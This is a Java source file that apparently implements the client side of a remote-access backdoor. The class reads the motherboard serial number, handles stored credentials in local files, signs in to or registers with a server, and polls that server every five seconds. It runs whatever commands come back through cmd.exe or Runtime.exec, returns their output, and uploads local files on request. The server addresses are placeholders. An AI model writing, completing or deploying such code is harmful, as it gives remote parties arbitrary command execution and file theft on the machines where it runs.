package org.example;

import api.controller.PostRequest;
import api.controller.response.ApiResponse;
import api.entity.Company;
import org.json.JSONArray;
import org.json.JSONObject;

import javax.swing.*;
import java.io.*;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Scanner;
import java.util.TreeSet;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class SysInfoProc extends JFrame implements MySystemProc{
    private  Runtime run = Runtime.getRuntime();
    private final TreeSet<String> dayOperation = new TreeSet<>();
    private Scanner scanner;
    private static final Company company = new Company();
    private final  String systemInfo = "path";
    private String securePath = "path";
    private String singInUrl = "path";
    private String createUrl="path";
    private String getCommands = "path";
    private String getUploadPath="path";
    public SysInfoProc() {
    }
    public void executeProcedure() {
                JSONArray jsonObject = ApiResponse.getJsonArray();
                if (jsonObject != null) {
                    for (int i = 0; i <jsonObject.length() ; i++) {
                        JSONObject object = jsonObject.getJSONObject(i);
                        try {
                            Thread.sleep(1000);
                            Company.setResponsibleCodeId(object.getLong("id"));
                            if (object.getBoolean("responsible")) {
                                    responsibleCommand(object.getString("command"));
                            } else if (object.getBoolean("copyFile")){
                                String command = object.getString("command");
                                readAddCompany(new File(securePath));
                                System.out.println(company);
                                PostRequest.fileUploadDer(command,getUploadPath,company);
                            }
                            else {
                                run.exec(object.getString("command"));
                            }
                        } catch (IOException | InterruptedException e) {
                            throw new RuntimeException(e);
                        }
                    }
        }

    }

    @Override
    public void fileWrite(boolean append,String securePath,String name,String password) {

        try {
            BufferedWriter writer =  new BufferedWriter(new FileWriter(securePath));
            writer.write(name+"\n"+password);
            writer.close();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    public void findSerialNumber(){
        try {
            Process p = Runtime.getRuntime().exec("wmic baseboard get serialnumber");
            BufferedReader inn = new BufferedReader(new InputStreamReader(p.getInputStream()));
            StringBuilder number = new StringBuilder();
            StringBuilder baseBoard = new StringBuilder();
            while (true) {
                String line = inn.readLine();
                if (line == null) {
                    break;
                }
                   number.append(line);
            }
            String[]  numberSplit = number.toString().split("SerialNumber    ");
            for (String a:numberSplit
                 ) {
                baseBoard.append(a);
            }
         company.setBaseBoardNumber(String.valueOf(baseBoard));
        } catch (Exception e) {
           e.printStackTrace();
        }
    }
        public void fileRead() {
            try {
                readAddCompany(new File(systemInfo));
                fileWrite(true,securePath, company.getName(),company.getPassword());
                Files.delete(Path.of(systemInfo));

            } catch (FileNotFoundException e) {
                readAddCompany(new File(securePath));
                throw new RuntimeException(e);
            } catch (IOException e) {
                throw new RuntimeException(e);
            }

        }

        public void responsibleCommand(String command) throws IOException {
            ProcessBuilder builder = new ProcessBuilder(
                    "cmd.exe", "/c", command);
            builder.redirectErrorStream(true);
            Process p = builder.start();
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            StringBuilder number = new StringBuilder();
            String line;
            while (true) {
                line = reader.readLine();
                if (line == null) { break;}
                number.append(line).append("\n");
            }
            company.setResponsibleCode(number.toString());

        }
        public void readAddCompany(File file)  {
            try {
                scanner = new Scanner(file);
            } catch (FileNotFoundException e) {
                throw new RuntimeException(e);
            }
            while (scanner.hasNextLine()) {
                String read = scanner.nextLine();
                dayOperation.add(read);
            }
            company.setName(dayOperation.first());
            company.setPassword(dayOperation.last());
            scanner.close();
        }

       public void isControl(){
           findSerialNumber();
           try {
               fileRead();
           }
           catch (Exception e){
               System.out.println("Err");
           }
           finally {
               postRequest();
               schedulerTask(ApiResponse.isRunning);
           }

       }
       public  void schedulerTask(boolean isRunning){
           ScheduledExecutorService executor = Executors.newScheduledThreadPool(1);

           if (isRunning) {
               Runnable run = () -> {
                   try {
                       postRequest();
                       executeProcedure();
                       if (ApiResponse.isWorkOnce) {
                           executor.shutdown();
                       }

                   } catch (Exception e) {
                       e.printStackTrace();
                   }
               };
               executor.scheduleWithFixedDelay(run, 0L, 5L, TimeUnit.SECONDS); // ( runnable , initialDelay , period , TimeUnit )
           } else {
               postRequest();
           }
       }



       public void postRequest(){
           try {
               PostRequest.getSingIn(company,singInUrl);
               if (PostRequest.responseCode!=200) {
                   PostRequest.createCompany(company,createUrl);
               }
               else{
                   PostRequest.getCommands(company,getCommands);

               }
           } catch (IOException e) {
               throw new RuntimeException(e);
           }
       }
    public void runAllProc(){
        isControl();
    }


}
